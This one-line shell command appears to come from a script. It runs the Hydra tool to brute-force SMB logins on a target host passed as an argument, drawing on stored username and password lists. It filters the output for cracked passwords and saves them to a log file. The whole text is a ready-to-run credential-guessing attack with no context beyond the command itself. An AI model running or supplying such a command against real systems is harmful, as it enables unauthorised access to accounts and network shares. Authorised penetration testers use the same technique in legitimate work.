hydra smb://$1 -L  ~/.cred-brute/my.logins.txt -P ~/.cred-brute/my.passwords.txt 2>&1 | grep 'password' | tee ~/hydra-cred-$1-000.log
